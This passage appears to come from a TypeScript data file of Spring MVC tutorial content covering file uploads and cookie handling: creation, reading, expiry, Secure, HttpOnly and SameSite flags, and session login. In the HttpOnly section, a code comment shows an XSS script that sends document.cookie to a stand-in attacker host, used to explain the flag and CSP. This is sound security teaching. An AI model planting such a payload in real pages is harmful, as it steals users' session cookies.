POST /upload HTTP/1.1
Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryX
(one part per field, each starting with the boundary line) -->`]],
        [['Test a multipart request with MockMvc.',
            r`@Test
void uploads() throws Exception {
    MockMultipartFile file = new MockMultipartFile(
        "file", "cv.pdf", "application/pdf", "data".getBytes());
    mvc.perform(multipart("/upload").file(file).param("title", "Resume"))
        .andExpect(status().isOk())
        .andExpect(content().string("Resume : cv.pdf (4 bytes)"));
}

// OUTPUT:
// Tests run: 1, Failures: 0, Errors: 0, Skipped: 0`],
            ['JSON part plus file with @RequestPart.',
                r`@PostMapping(path = "/documents",
             consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
public String create(@RequestPart("meta") DocMeta meta,
                     @RequestPart("file") MultipartFile file) {
    return meta.title() + " / " + file.getOriginalFilename();
}

// OUTPUT:
// curl -F 'meta={"title":"Plan"};type=application/json' -F file=@p.txt /documents
// Plan / p.txt`]]
    ),

    'mvc-multipartfile': x(
        ['<b>MultipartFile</b>: the Spring interface that represents one uploaded file in a multipart request; you receive it as a controller parameter.',
            '<b>Main methods</b>: <code>getOriginalFilename()</code>, <code>getSize()</code>, <code>getContentType()</code>, <code>isEmpty()</code>, <code>getBytes()</code> and <code>transferTo(Path)</code>.',
            '<b>Save</b> a file with <code>file.transferTo(target)</code>; the temporary data is deleted after the request, so you must copy it if you want to keep it.'],
        ['<b>Check first</b>: call <code>isEmpty()</code> and verify size and content type before saving.',
            '<b>Many files</b>: use <code>MultipartFile[]</code> or <code>List&lt;MultipartFile&gt;</code> with the same part name.',
            '<b>Streams</b>: <code>getInputStream()</code> lets you process a large file without loading it all with <code>getBytes()</code>.'],
        ['<b>Path traversal</b>: the original file name is user input and may contain <code>../</code>; generate your own name or clean it with <code>StringUtils.cleanPath</code> and check it.',
            '<b>Content type</b> comes from the client and can be false; inspect the real content (magic bytes) for strict checks.',
            '<b>Memory</b>: <code>getBytes()</code> loads the whole file into memory, so avoid it for big files and set size limits.'],
        [['F', 'What is MultipartFile?', 'A Spring interface for an uploaded file that gives its name, size, type and content.'],
            ['F', 'How do you save an uploaded file?', 'Call file.transferTo(path) or copy getInputStream() to the target with Files.copy.'],
            ['M', 'How do you accept several files?', 'Declare a MultipartFile[] or List<MultipartFile> parameter and send all files with the same part name.'],
            ['M', 'Why not use getOriginalFilename directly as the path?', 'It is user controlled and may contain ../ segments, which allows writing outside the upload folder.'],
            ['S', 'How do you upload large files safely?', 'Set max-file-size and max-request-size, stream with getInputStream instead of getBytes, and validate type and size.'],
            ['S', 'How do you handle files that exceed the limit?', 'Handle MaxUploadSizeExceededException in a @ControllerAdvice and return 413 Payload Too Large with a message.']],
        [['Save a file safely.',
            r`@PostMapping("/files")
public ResponseEntity<String> save(@RequestParam MultipartFile file)
        throws IOException {
    if (file.isEmpty()) {
        return ResponseEntity.badRequest().body("No file");
    }
    String name = UUID.randomUUID() + ".dat";        // own name, not the client one
    Path target = Path.of("uploads").resolve(name);
    Files.createDirectories(target.getParent());
    file.transferTo(target);
    return ResponseEntity.ok("Saved as " + name);
}

// OUTPUT:
// curl -F file=@photo.png http://localhost:8080/files
// Saved as 6b1c9e0a-....dat (varies)`],
            ['Limits in application.properties.',
                r`spring.servlet.multipart.enabled=true
spring.servlet.multipart.max-file-size=5MB
spring.servlet.multipart.max-request-size=10MB
spring.servlet.multipart.file-size-threshold=1MB

# OUTPUT:
# A 6 MB file -> MaxUploadSizeExceededException -> HTTP 413`]],
        [['Handle the size error.',
            r`@RestControllerAdvice
class UploadErrors {
    @ExceptionHandler(MaxUploadSizeExceededException.class)
    ResponseEntity<String> tooBig() {
        return ResponseEntity.status(HttpStatus.PAYLOAD_TOO_LARGE)
            .body("File is too large (max 5 MB)");
    }
}

// OUTPUT:
// HTTP/1.1 413
// File is too large (max 5 MB)`],
            ['Test empty and valid files.',
                r`@Test
void rejectsEmptyFile() throws Exception {
    MockMultipartFile empty =
        new MockMultipartFile("file", "a.txt", "text/plain", new byte[0]);
    mvc.perform(multipart("/files").file(empty))
        .andExpect(status().isBadRequest());
}

// OUTPUT:
// Tests run: 1, Failures: 0, Errors: 0, Skipped: 0`]]
    )
};

export const smvc23Deep: Record<string, Deep> = {
    'mvc-creating-cookies': dv(
        [`<p>A cookie is only a header exchange; the servlet container writes it.</p><ul><li><b>addCookie:</b> <code>HttpServletResponse.addCookie</code> turns the <code>Cookie</code> object into a <code>Set-Cookie</code> header when the response is built.</li><li><b>Browser:</b> stores it by name, Path and Domain, and decides later which requests get it.</li><li><b>Next request:</b> the browser adds a <code>Cookie: name=value</code> header and the container parses it into <code>getCookies()</code>.</li><li><b>ResponseCookie:</b> is an immutable Spring class that builds the same header text, including <code>SameSite</code>.</li></ul>`,
            r`// What the servlet container writes after response.addCookie(...)
// HTTP/1.1 200
// Set-Cookie: theme=dark; Max-Age=604800; Expires=(varies); Path=/
// Content-Length: 11
//
// Next request from the browser:
// GET /home HTTP/1.1
// Cookie: theme=dark

// OUTPUT:
// request.getCookies()[0].getName()  -> theme
// request.getCookies()[0].getValue() -> dark`],
        [`<p>Ways to create a cookie:</p><ul><li><b>Servlet Cookie:</b> simple, with <code>setPath</code>, <code>setMaxAge</code>, <code>setHttpOnly</code>, <code>setSecure</code>, <code>setDomain</code>.</li><li><b>ResponseCookie:</b> fluent builder with <code>sameSite</code> and <code>Duration</code>.</li><li><b>Session cookie:</b> no max age, so it ends with the browser session.</li><li><b>Persistent cookie:</b> has <code>Max-Age</code> or <code>Expires</code>.</li><li><b>Boot properties:</b> only for the session cookie.</li></ul>`,
            r`ResponseCookie full = ResponseCookie.from("remember", "yes")
    .domain("example.com")
    .path("/")
    .maxAge(Duration.ofDays(14))
    .httpOnly(true)
    .secure(true)
    .sameSite("Lax")
    .build();
System.out.println(full);

// OUTPUT:
// remember=yes; Path=/; Domain=example.com; Max-Age=1209600; Expires=(varies); Secure; HttpOnly; SameSite=Lax`],
        [`<p>Common mistakes:</p><ul><li><b>Illegal characters:</b> spaces, commas and semicolons in a value; encode the value (URL or Base64) first.</li><li><b>Missing path:</b> the cookie is scoped to the creating URL directory and is not seen elsewhere; set <code>Path=/</code>.</li><li><b>Seconds vs milliseconds:</b> <code>setMaxAge</code> takes seconds.</li><li><b>Storing secrets:</b> never put passwords or full user data in a cookie.</li><li><b>Setting after commit:</b> a cookie added after the response is already written is lost.</li></ul>`,
            r`// WRONG: value has a space and a semicolon; max age is in ms
Cookie bad = new Cookie("note", "hello world; x");
bad.setMaxAge(7 * 24 * 60 * 60 * 1000);      // far too long

// RIGHT: encode the value, use seconds, set the path
Cookie good = new Cookie("note",
    URLEncoder.encode("hello world; x", StandardCharsets.UTF_8));
good.setMaxAge(7 * 24 * 60 * 60);
good.setPath("/");
response.addCookie(good);

// OUTPUT:
// Set-Cookie: note=hello+world%3B+x; Max-Age=604800; Path=/`],
        [`<p>Cookies travel on every request to the matching path, so they cost bandwidth.</p><ul><li><b>Keep them small:</b> only ids and flags.</li><li><b>Narrow Path:</b> scope big cookies to the paths that need them.</li><li><b>Static files:</b> serve images and scripts from a cookieless domain.</li><li><b>Lifetime:</b> short lifetimes limit stale data and risk.</li><li><b>Count:</b> avoid many cookies; combine small values server-side.</li></ul>`,
            r`// 20 cookies of 200 bytes add about 4 KB to every request header.
// Better: one id cookie and the data on the server.
Cookie sid = new Cookie("sid", sessionId);
sid.setPath("/app");        // not sent for /static/** or other apps
sid.setHttpOnly(true);
response.addCookie(sid);

// OUTPUT:
// Request header size: 4 KB (20 cookies) -> 50 bytes (one id cookie)`],
        [`<p>Scenario: a shop remembers the language and the cart id of an anonymous visitor.</p><ul><li><b>Language:</b> a persistent, non-sensitive cookie.</li><li><b>Cart id:</b> an opaque id cookie with HttpOnly and Secure; the cart itself lives in the database.</li></ul>`,
            r`@GetMapping("/shop")
public ResponseEntity<String> shop(
        @CookieValue(name = "cart", required = false) String cartId) {
    if (cartId != null) return ResponseEntity.ok("Cart " + cartId);
    String id = UUID.randomUUID().toString();
    ResponseCookie c = ResponseCookie.from("cart", id)
        .httpOnly(true).secure(true).sameSite("Lax")
        .path("/").maxAge(Duration.ofDays(30)).build();
    return ResponseEntity.ok()
        .header(HttpHeaders.SET_COOKIE, c.toString())
        .body("New cart " + id);
}

// OUTPUT: (varies)
// 1st visit -> New cart 8d1f...   Set-Cookie: cart=8d1f...
// 2nd visit -> Cart 8d1f...`]
    ),

    'mvc-reading-cookies': dv(
        [`<p>How a cookie reaches your method:</p><ul><li><b>Container:</b> parses the <code>Cookie</code> header into <code>Cookie</code> objects.</li><li><b>DispatcherServlet:</b> picks the handler method through <code>RequestMappingHandlerAdapter</code>.</li><li><b>Resolver:</b> <code>ServletCookieValueMethodArgumentResolver</code> (an <code>AbstractNamedValueMethodArgumentResolver</code>) finds the cookie by name.</li><li><b>Conversion:</b> the value goes through <code>ConversionService</code> to the parameter type.</li><li><b>Missing:</b> if required and absent, <code>MissingRequestCookieException</code> is thrown, resolved to 400.</li></ul>`,
            r`// Request:
// GET /home HTTP/1.1
// Cookie: theme=dark; visits=4
//
// Resolution for  @CookieValue("visits") int visits :
//   getCookies() -> find name "visits" -> "4" -> Integer 4 -> parameter

// OUTPUT:
// visits = 4`],
        [`<p>Options of <code>@CookieValue</code>:</p><ul><li><b>value / name:</b> the cookie name; if omitted, the parameter name is used when compiled with <code>-parameters</code>.</li><li><b>required:</b> default true.</li><li><b>defaultValue:</b> used when absent; also makes it not required.</li><li><b>Types:</b> <code>String</code>, numbers, <code>Optional</code>, or the <code>Cookie</code> object itself.</li></ul>`,
            r`@GetMapping("/a")
String a(@CookieValue("theme") String theme) { return theme; }

@GetMapping("/b")
String b(@CookieValue(name = "theme", required = false) String t) {
    return t == null ? "none" : t;
}

@GetMapping("/c")
String c(@CookieValue("theme") Cookie cookie) {      // the whole object
    return cookie.getName() + "=" + cookie.getValue();
}

@GetMapping("/d")
String d(@CookieValue("n") Optional<Integer> n) { return "n=" + n.orElse(0); }

// OUTPUT:
// /a (no cookie)       -> 400 Bad Request
// /b (no cookie)       -> none
// /c (theme=dark)      -> theme=dark
// /d (no cookie)       -> n=0`],
        [`<p>Common mistakes:</p><ul><li><b>Forgetting null:</b> <code>getCookies()</code> can return <code>null</code>.</li><li><b>Wrong type:</b> a text cookie bound to <code>int</code> gives 400 (type mismatch).</li><li><b>Trusting the value:</b> do not use it in SQL, file paths or HTML without checking.</li><li><b>Expecting attributes:</b> <code>getMaxAge()</code> on a request cookie is always -1.</li></ul>`,
            r`// WRONG: NullPointerException when there are no cookies
// for (Cookie c : request.getCookies()) { ... }

// RIGHT
Cookie[] cookies = request.getCookies();
if (cookies != null) {
    for (Cookie c : cookies) {
        if ("theme".equals(c.getName())) System.out.println(c.getValue());
    }
}

// OUTPUT:
// dark   (no exception when the request has no cookies)`],
        [`<p>Reading is cheap, but keep these points in mind:</p><ul><li><b>Header size:</b> all cookies are parsed on every request; fewer, smaller cookies are faster.</li><li><b>Utility:</b> <code>WebUtils.getCookie(request, name)</code> avoids writing the loop each time.</li><li><b>Caching:</b> responses that depend on a cookie need <code>Vary: Cookie</code> to stay safe in shared caches.</li></ul>`,
            r`Cookie theme = WebUtils.getCookie(request, "theme");
String value = theme == null ? "light" : theme.getValue();
response.setHeader(HttpHeaders.VARY, "Cookie");     // response differs per cookie

// OUTPUT:
// value = dark
// Vary: Cookie`],
        [`<p>Scenario: choose the page theme from a cookie, with a safe whitelist.</p><ul><li><b>Validate:</b> accept only known values.</li><li><b>Default:</b> fall back to light.</li></ul>`,
            r`private static final Set<String> THEMES = Set.of("light", "dark");

@GetMapping("/dashboard")
public String dashboard(
        @CookieValue(name = "theme", defaultValue = "light") String theme,
        Model model) {
    model.addAttribute("theme", THEMES.contains(theme) ? theme : "light");
    return "dashboard";
}

// OUTPUT:
// Cookie: theme=dark          -> model theme = dark
// Cookie: theme=<script>      -> model theme = light (rejected)`]
    ),

    'mvc-updating-cookies': dv(
        [`<p>Updating is overwriting at the browser.</p><ul><li><b>Key:</b> the browser stores cookies in a jar keyed by name, domain and path.</li><li><b>Set-Cookie:</b> when a response has the same key, the stored cookie is replaced, including its expiry.</li><li><b>Different key:</b> a different Path or Domain makes a second cookie, and both may be sent.</li><li><b>Order:</b> when two cookies match, the browser sends the longer path first.</li></ul>`,
            r`// Jar before: theme=dark  (Domain=app.com, Path=/)
// Response: Set-Cookie: theme=blue; Path=/      -> same key  -> replaced
// Response: Set-Cookie: theme=red;  Path=/admin -> new key   -> added
//
// Request to /admin/home sends: Cookie: theme=red; theme=blue

// OUTPUT:
// jar = { theme=blue (/), theme=red (/admin) }`],
        [`<p>Ways to update:</p><ul><li><b>Replace value:</b> new value, same attributes.</li><li><b>Slide expiry:</b> same value, new Max-Age on each request.</li><li><b>Change flags:</b> send a cookie with the new flags and the same key.</li><li><b>Interceptor or filter:</b> refresh a cookie across all requests.</li></ul>`,
            r`@Component
class SlidingCookieInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest req,
                             HttpServletResponse res, Object handler) {
        Cookie c = WebUtils.getCookie(req, "last-seen");
        if (c != null) {
            Cookie fresh = new Cookie("last-seen", String.valueOf(
                System.currentTimeMillis()));
            fresh.setPath("/");
            fresh.setMaxAge(30 * 24 * 60 * 60);
            res.addCookie(fresh);
        }
        return true;
    }
}

// OUTPUT: (varies)
// Set-Cookie: last-seen=1767225600000; Max-Age=2592000; Path=/`],
        [`<p>Common mistakes:</p><ul><li><b>Path or Domain mismatch:</b> creates duplicates.</li><li><b>Flags dropped:</b> the update omits <code>HttpOnly</code> or <code>Secure</code>, so a safe cookie becomes unsafe.</li><li><b>Update after commit:</b> the response is already sent.</li><li><b>Reading your own write:</b> the new value is only visible on the next request, not in the same request.</li></ul>`,
            r`// WRONG: the update forgets HttpOnly and Secure that the login cookie had
Cookie weak = new Cookie("auth", newToken);
weak.setPath("/");
response.addCookie(weak);

// RIGHT: build every write through one helper
static ResponseCookie authCookie(String token) {
    return ResponseCookie.from("auth", token)
        .httpOnly(true).secure(true).sameSite("Lax").path("/").build();
}

// OUTPUT:
// weak : Set-Cookie: auth=...; Path=/
// right: Set-Cookie: auth=...; Path=/; Secure; HttpOnly; SameSite=Lax`],
        [`<p>Updates add bytes to every response; reduce them:</p><ul><li><b>Write on change:</b> skip the header when the value is the same.</li><li><b>Throttle sliding expiry:</b> refresh only when the cookie is older than a threshold.</li><li><b>Server state:</b> keep frequently changing data in the session, not a cookie.</li></ul>`,
            r`long now = System.currentTimeMillis();
long stamp = Long.parseLong(lastSeen);
if (now - stamp > Duration.ofHours(1).toMillis()) {   // refresh at most hourly
    response.addCookie(refreshed(now));
}

// OUTPUT:
// Requests inside the hour send no Set-Cookie; the first one after it does`],
        [`<p>Scenario: remember-me style sliding login that lasts 14 days after the last visit.</p><ul><li><b>Each visit</b> refreshes the lifetime.</li><li><b>Inactive users</b> expire naturally.</li></ul>`,
            r`@GetMapping("/app")
public ResponseEntity<String> app(
        @CookieValue(name = "remember", required = false) String token) {
    if (token == null || !tokens.isValid(token)) {
        return ResponseEntity.status(401).body("Login needed");
    }
    ResponseCookie fresh = ResponseCookie.from("remember", token)
        .httpOnly(true).secure(true).sameSite("Lax")
        .path("/").maxAge(Duration.ofDays(14)).build();
    return ResponseEntity.ok()
        .header(HttpHeaders.SET_COOKIE, fresh.toString())
        .body("Welcome back");
}

// OUTPUT:
// Valid token   -> 200 Welcome back (Max-Age reset to 1209600)
// No token      -> 401 Login needed`]
    ),

    'mvc-deleting-cookies': dv(
        [`<p>Deleting is an expiry instruction.</p><ul><li><b>Max-Age=0</b> or a past <code>Expires</code> date tells the browser to drop the cookie matching name, domain and path.</li><li><b>Container:</b> the servlet container writes both <code>Max-Age=0</code> and an old <code>Expires</code> for compatibility.</li><li><b>No match:</b> if the key differs, nothing is deleted and the old cookie lives on.</li></ul>`,
            r`// Browser jar: sid=abc (Path=/app)
// Response A: Set-Cookie: sid=; Max-Age=0; Path=/       -> different key, no effect
// Response B: Set-Cookie: sid=; Max-Age=0; Path=/app    -> same key, deleted

// OUTPUT:
// after A: sid=abc still stored
// after B: jar is empty`],
        [`<p>Variants:</p><ul><li><b>Servlet:</b> <code>setMaxAge(0)</code>.</li><li><b>ResponseCookie:</b> <code>maxAge(0)</code>, or <code>Duration.ZERO</code>.</li><li><b>Spring Security:</b> <code>.logout(l -&gt; l.deleteCookies("JSESSIONID"))</code>.</li><li><b>Clear-Site-Data:</b> <code>HeaderWriterLogoutHandler</code> with <code>ClearSiteDataHeaderWriter</code> can clear cookies and storage.</li></ul>`,
            r`ResponseCookie gone = ResponseCookie.from("remember", "")
    .path("/").maxAge(Duration.ZERO).build();
System.out.println(gone);

http.logout(l -> l
    .logoutUrl("/logout")
    .deleteCookies("JSESSIONID", "remember")
    .logoutSuccessUrl("/login?bye"));

// OUTPUT:
// remember=; Path=/; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT`],
        [`<p>Common mistakes:</p><ul><li><b>Different Path or Domain:</b> the delete is ignored.</li><li><b>Using -1:</b> that means session cookie, not delete.</li><li><b>JavaScript delete of HttpOnly:</b> not possible.</li><li><b>Client-only logout:</b> deleting the cookie but not the server session leaves a valid session id.</li></ul>`,
            r`// WRONG: -1 keeps the cookie until the browser closes
Cookie wrong = new Cookie("token", "");
wrong.setMaxAge(-1);

// RIGHT: 0 deletes; match the original path
Cookie right = new Cookie("token", "");
right.setPath("/");
right.setMaxAge(0);
response.addCookie(right);
session.invalidate();      // also end the server side

// OUTPUT:
// wrong: cookie still present
// right: cookie removed and session invalid`],
        [`<p>Deleting is cheap. The concern is cleaning up:</p><ul><li><b>Server state:</b> remove session or token records so storage does not grow.</li><li><b>Many cookies:</b> clear only the cookies your app owns, not all of them.</li><li><b>Domain cookies:</b> subdomain cookies need the same <code>Domain</code> to be deleted.</li></ul>`,
            r`ResponseCookie gone = ResponseCookie.from("sso", "")
    .domain("example.com")        // must match the creating cookie
    .path("/")
    .maxAge(0)
    .build();

// OUTPUT:
// Set-Cookie: sso=; Path=/; Domain=example.com; Max-Age=0`],
        [`<p>Scenario: logout that removes the session, the remember-me cookie and the CSRF cookie.</p><ul><li><b>Server:</b> invalidate the session.</li><li><b>Browser:</b> send three expiring cookies.</li></ul>`,
            r`@PostMapping("/logout")
public ResponseEntity<Void> logout(HttpSession session) {
    session.invalidate();
    ResponseEntity.BodyBuilder ok = ResponseEntity.noContent();
    for (String name : List.of("JSESSIONID", "remember", "XSRF-TOKEN")) {
        ok.header(HttpHeaders.SET_COOKIE,
            ResponseCookie.from(name, "").path("/").maxAge(0).build()
                .toString());
    }
    return ok.build();
}

// OUTPUT:
// HTTP/1.1 204
// Set-Cookie: JSESSIONID=; Path=/; Max-Age=0
// Set-Cookie: remember=; Path=/; Max-Age=0
// Set-Cookie: XSRF-TOKEN=; Path=/; Max-Age=0`]
    ),

    'mvc-secure-cookies': dv(
        [`<p>The browser enforces the Secure flag; the server only sets it.</p><ul><li><b>Browser rule:</b> a Secure cookie is stored only when it comes from an HTTPS response and is sent only on HTTPS requests.</li><li><b>Spring Boot:</b> reads <code>server.servlet.session.cookie.*</code> into the servlet <code>SessionCookieConfig</code>.</li><li><b>Proxy:</b> with TLS termination, <code>request.isSecure()</code> depends on forwarded headers.</li></ul>`,
            r`// HTTPS response:  Set-Cookie: auth=1; Secure   -> stored
// HTTP  response:  Set-Cookie: auth=1; Secure   -> rejected by the browser
// HTTP  request  : the stored Secure cookie is NOT sent

// OUTPUT:
// https://shop.example.com/cart  -> Cookie: auth=1
// http://shop.example.com/cart   -> (no Cookie header)`],
        [`<p>Related settings:</p><ul><li><b>Boot properties:</b> <code>secure</code>, <code>http-only</code>, <code>same-site</code>, <code>name</code>, <code>max-age</code>, <code>path</code>, <code>domain</code>.</li><li><b>Cookie prefixes:</b> <code>__Secure-</code> needs Secure; <code>__Host-</code> needs Secure, Path=/ and no Domain.</li><li><b>HSTS:</b> forces HTTPS for later visits.</li><li><b>Proxy headers:</b> <code>server.forward-headers-strategy</code> (<code>native</code> or <code>framework</code>).</li></ul>`,
            r`server.servlet.session.cookie.name=__Host-SESSION
server.servlet.session.cookie.secure=true
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.same-site=strict
server.servlet.session.cookie.path=/
server.servlet.session.cookie.max-age=30m

# OUTPUT:
# Set-Cookie: __Host-SESSION=ABC;
Path=/;
Max-Age=1800;
Secure;
HttpOnly;
SameSite=Strict`],
        [`<p>Common mistakes:</p><ul><li><b>Secure on local HTTP:</b> the cookie never comes back, so login appears broken in development; use a profile for dev.</li><li><b>Proxy hides HTTPS:</b> the cookie is not marked Secure or redirects loop.</li><li><b>Mixed content:</b> one HTTP page of the site can expose non-Secure cookies.</li><li><b>Secure value inside:</b> a Secure flag does not encrypt a cookie value.</li></ul>`,
            r`# application-dev.properties : allow plain HTTP only for local work
server.servlet.session.cookie.secure=false

# application-prod.properties
server.servlet.session.cookie.secure=true
server.forward-headers-strategy=framework

# OUTPUT:
# dev : Set-Cookie: JSESSIONID=...;
Path=/;
HttpOnly
# prod: Set-Cookie: JSESSIONID=...;
Path=/;
Secure;
HttpOnly`],
        [`<p>HTTPS has a cost, but small:</p><ul><li><b>TLS sessions:</b> resumption and HTTP/2 make the cost low.</li><li><b>HSTS preload:</b> removes the first insecure redirect.</li><li><b>Cookie size:</b> flags add a few bytes only.</li></ul>`,
            r`http.headers(h -> h.httpStrictTransportSecurity(hsts -> hsts
    .includeSubDomains(true)
    .maxAgeInSeconds(31536000)));

// OUTPUT:
// Strict-Transport-Security: max-age=31536000 ; includeSubDomains`],
        [`<p>Scenario: production deployment behind a load balancer that ends TLS.</p><ul><li><b>Proxy</b> sends <code>X-Forwarded-Proto: https</code>.</li><li><b>App</b> trusts it so cookies and redirects use HTTPS.</li></ul>`,
            r`server.forward-headers-strategy=framework
server.servlet.session.cookie.secure=true
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.same-site=lax

# OUTPUT:
# Request:  http from the proxy + X-Forwarded-Proto: https
# Response: Set-Cookie: JSESSIONID=...;
Path=/;
Secure;
HttpOnly;
SameSite=Lax`]
    ),

    'mvc-httponly': dv(
        [`<p>HttpOnly is enforced inside the browser.</p><ul><li><b>Storage:</b> the cookie jar marks the cookie as http-only.</li><li><b>JavaScript:</b> <code>document.cookie</code> returns only cookies without the flag, and a script write to an HttpOnly name is ignored.</li><li><b>Network:</b> the cookie is still attached to requests by the browser itself.</li><li><b>Spring Boot:</b> sets the session cookie HttpOnly by default.</li></ul>`,
            r`// Response:  Set-Cookie: sid=abc; HttpOnly
//            Set-Cookie: theme=dark
// In the page:
//   document.cookie                -> "theme=dark"     (sid hidden)
//   fetch("/api")                  -> sends sid and theme

// OUTPUT:
// Cookie: sid=abc; theme=dark   (on the network request)`],
        [`<p>Where to set it:</p><ul><li><b>Cookie:</b> <code>setHttpOnly(true)</code>.</li><li><b>ResponseCookie:</b> <code>httpOnly(true)</code>.</li><li><b>Session:</b> <code>server.servlet.session.cookie.http-only</code>.</li><li><b>Spring Security CSRF:</b> <code>CookieCsrfTokenRepository.withHttpOnlyFalse()</code> for script-readable tokens, and <code>new CookieCsrfTokenRepository()</code> defaults to HttpOnly true.</li></ul>`,
            r`http.csrf(c -> c.csrfTokenRepository(
    CookieCsrfTokenRepository.withHttpOnlyFalse()));  // SPA reads XSRF-TOKEN

// OUTPUT:
// Set-Cookie: XSRF-TOKEN=7c1e...(varies); Path=/`],
        [`<p>Common mistakes:</p><ul><li><b>Forgetting the flag</b> on auth cookies.</li><li><b>Thinking it stops XSS:</b> it only stops cookie theft.</li><li><b>HttpOnly on a cookie JS needs:</b> the front end cannot read it, so features break.</li><li><b>Debugging confusion:</b> the cookie is hidden from <code>document.cookie</code> but visible in browser developer tools.</li></ul>`,
            r`// XSS payload injected into the page:
// <script>fetch("https://evil.example/?c=" + document.cookie)</script>
//   without HttpOnly -> sends sid=abc to the attacker
//   with HttpOnly    -> sends an empty string

// Still needed: escape output (Thymeleaf th:text) and set a CSP header
http.headers(h -> h.contentSecurityPolicy(
    csp -> csp.policyDirectives("script-src 'self'")));

// OUTPUT:
// Content-Security-Policy: script-src 'self'`],
        [`<p>There is no performance cost. A review checklist:</p><ul><li><b>Audit:</b> list all cookies and mark which scripts need them.</li><li><b>Default:</b> HttpOnly unless a script truly needs the value.</li><li><b>Test:</b> a MockMvc test per auth cookie keeps the flag from being lost.</li></ul>`,
            r`@ParameterizedTest
@ValueSource(strings = {"/login", "/session/start"})
void authCookiesAreHttpOnly(String url) throws Exception {
    mvc.perform(post(url))
        .andExpect(header().string(HttpHeaders.SET_COOKIE,
            containsString("HttpOnly")));
}

// OUTPUT:
// Tests run: 2, Failures: 0, Errors: 0, Skipped: 0`],
        [`<p>Scenario: single-page app with a cookie session and CSRF.</p><ul><li><b>Session cookie:</b> HttpOnly, hidden from the script.</li><li><b>CSRF cookie:</b> readable, copied into a header.</li></ul>`,
            r`// Response after login
// Set-Cookie: JSESSIONID=...; Path=/; Secure; HttpOnly; SameSite=Lax
// Set-Cookie: XSRF-TOKEN=...; Path=/; Secure; SameSite=Lax
//
// Script: fetch("/api/orders", { method: "POST",
//   headers: { "X-XSRF-TOKEN": readCookie("XSRF-TOKEN") },
//   credentials: "same-origin" })

// OUTPUT:
// POST /api/orders with valid header   -> 201
// POST /api/orders without the header  -> 403`]
    ),

    'mvc-samesite': dv(
        [`<p>The browser decides per request.</p><ul><li><b>Site:</b> scheme plus registrable domain (eTLD+1); ports and subdomains do not matter for "same site".</li><li><b>Strict:</b> cookie sent only when the request starts from the same site.</li><li><b>Lax:</b> also sent for top-level navigations using safe methods such as GET.</li><li><b>None:</b> always sent, but only if <code>Secure</code>.</li><li><b>Framework:</b> <code>ResponseCookie.sameSite</code> only writes the attribute; Tomcat writes it for the session cookie from the Boot property.</li></ul>`,
            r`// Page on https://evil.com submits a form to https://bank.com/transfer
//   SameSite=Strict -> cookie NOT sent
//   SameSite=Lax    -> NOT sent for POST; sent for a link click (GET)
//   SameSite=None   -> sent (CSRF risk, token needed)

// OUTPUT:
// POST from evil.com: Strict no, Lax no, None yes`],
        [`<p>How to choose:</p><ul><li><b>Strict:</b> banking style apps where an extra login after an external link is fine.</li><li><b>Lax:</b> good default for normal sites.</li><li><b>None + Secure:</b> embedded widgets, payment frames, separate API domain.</li></ul>`,
            r`server.servlet.session.cookie.same-site=lax

// Per cookie in code
ResponseCookie strict = ResponseCookie.from("a", "1").sameSite("Strict").build();
ResponseCookie lax    = ResponseCookie.from("b", "1").sameSite("Lax").build();
ResponseCookie none   = ResponseCookie.from("c", "1").sameSite("None")
                                      .secure(true).build();

# OUTPUT:
# a=1;
SameSite=Strict
# b=1;
SameSite=Lax
# c=1;
Secure;
SameSite=None`],
        [`<p>Common mistakes:</p><ul><li><b>None without Secure:</b> rejected by modern browsers.</li><li><b>Strict on the login cookie:</b> external links appear logged out.</li><li><b>Relying on it only:</b> keep CSRF tokens.</li><li><b>Mixing up site and origin:</b> CORS settings are separate from SameSite.</li><li><b>Typo in value:</b> <code>lax</code> and <code>Lax</code> are accepted, but a wrong word is ignored by the browser.</li></ul>`,
            r`// WRONG: cross-site front end (app.com calling api.other.com) with Lax
//   -> the session cookie is not sent on the fetch call
// RIGHT: SameSite=None; Secure, plus CORS allowing credentials
@Bean
CorsConfigurationSource cors() {
    CorsConfiguration c = new CorsConfiguration();
    c.setAllowedOrigins(List.of("https://app.com"));
    c.setAllowedMethods(List.of("GET", "POST"));
    c.setAllowCredentials(true);
    UrlBasedCorsConfigurationSource s = new UrlBasedCorsConfigurationSource();
    s.registerCorsConfiguration("/**", c);
    return s;
}

// OUTPUT:
// Access-Control-Allow-Origin: https://app.com
// Access-Control-Allow-Credentials: true`],
        [`<p>No runtime cost, but check the effect on behaviour:</p><ul><li><b>Test browsers:</b> verify flows in current versions of Chrome, Firefox and Safari.</li><li><b>Logging:</b> log missing-cookie rates after a change.</li></ul>`,
            r`// Quick manual check with curl
// curl -i -X POST https://app.com/login -d "u=abaji&p=secret"

// OUTPUT:
// HTTP/1.1 200
// Set-Cookie: JSESSIONID=...; Path=/; Secure; HttpOnly; SameSite=Lax`],
        [`<p>Scenario: the web app is on <code>app.example.com</code> and the API on <code>api.example.com</code>.</p><ul><li><b>Same site:</b> both share <code>example.com</code>, so Lax works for fetch calls from the app.</li><li><b>Different site:</b> needs None, Secure and CORS credentials.</li></ul>`,
            r`ResponseCookie session = ResponseCookie.from("SESSION", id)
    .domain("example.com")      // shared by app. and api.
    .path("/")
    .httpOnly(true).secure(true)
    .sameSite("Lax")
    .build();

// OUTPUT:
// Set-Cookie: SESSION=...; Path=/; Domain=example.com; Secure; HttpOnly; SameSite=Lax
// fetch from app.example.com to api.example.com carries the cookie`]
    ),

    'mvc-cookie-based-authentication': dv(
        [`<p>How Spring Security handles a cookie session:</p><ul><li><b>Filter chain:</b> <code>SecurityContextHolderFilter</code> loads the <code>SecurityContext</code> from the session (via <code>HttpSessionSecurityContextRepository</code>).</li><li><b>Login:</b> <code>UsernamePasswordAuthenticationFilter</code> calls the <code>AuthenticationManager</code>, then a session strategy changes the session id.</li><li><b>Next request:</b> the <code>JSESSIONID</code> cookie finds the session, and the stored <code>Authentication</code> becomes the current user.</li><li><b>Authorization:</b> <code>AuthorizationFilter</code> checks rules against it.</li></ul>`,
            r`// 1) POST /login  user=abaji&password=...
//    -> AuthenticationManager OK -> new session id -> Set-Cookie: JSESSIONID=B2
// 2) GET /orders  Cookie: JSESSIONID=B2
//    -> SecurityContext restored from the session -> user abaji -> 200
// 3) GET /orders  (no cookie) -> no Authentication -> 302 /login

// OUTPUT:
